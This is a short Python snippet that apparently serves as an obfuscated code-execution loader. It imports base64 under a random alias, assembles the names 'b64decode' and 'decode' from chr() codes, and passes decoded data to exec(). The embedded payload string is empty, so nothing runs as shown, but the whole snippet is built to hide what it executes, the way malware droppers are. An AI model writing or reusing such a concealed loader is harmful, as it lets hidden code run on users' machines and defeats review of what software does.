import base64 as alfXtzWc
RgcHfQsJ = ""
CRkaUyLI = getattr(alfXtzWc, chr(98)+chr(54)+chr(52)+chr(100)+chr(101)+chr(99)+chr(111)+chr(100)+chr(101))
exec(getattr(bytes, chr(100)+chr(101)+chr(99)+chr(111)+chr(100)+chr(101))(CRkaUyLI(RgcHfQsJ), "utf-8"))
